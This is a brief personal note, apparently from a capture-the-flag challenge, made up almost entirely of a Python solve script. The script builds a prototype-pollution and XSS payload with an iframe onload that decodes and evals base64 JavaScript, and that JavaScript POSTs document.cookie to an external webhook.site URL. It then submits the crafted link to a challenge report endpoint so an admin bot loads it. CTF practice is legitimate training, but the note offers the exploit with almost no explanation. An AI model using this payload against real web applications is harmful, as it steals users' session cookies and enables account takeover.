---
created: 2025-07-28T01:40
updated: 2025-07-28T02:12
---

Forgot the flag, but this was how I solved it.

```python
import base64
import requests

code = base64.b64encode(b"""
fetch('https://webhook.site/ae498600-1949-4b36-96c2-24127fd673fd',{
method: 'POST',
body:document.cookie
});
""").decode()
payload = f'__proto__.test=toString&__proto__.*=onload&note=<iframe src="" onload=eval(atob("{code}"))>'
payload=f'http://127.0.0.1:5000/?{payload}'


print(requests.post("http://34.134.162.213:17002/report", data={
    "url":payload
}).text)
```
